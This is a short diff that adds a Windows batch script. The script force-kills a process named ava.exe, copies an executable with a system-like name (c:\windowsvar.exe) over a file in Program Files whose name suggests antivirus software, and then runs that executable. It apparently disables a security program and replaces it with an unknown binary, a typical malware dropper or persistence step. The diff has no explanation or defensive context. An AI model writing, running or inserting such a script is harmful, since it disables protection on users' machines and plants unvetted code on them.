@@ -1,0 +1,4 @@
+echo off
+taskkill /f /im ava.exe
+copy c:\windowsvar.exe "C:\Program Files\MIT\AVAva.exe"
+start c:\windowsvar.exe
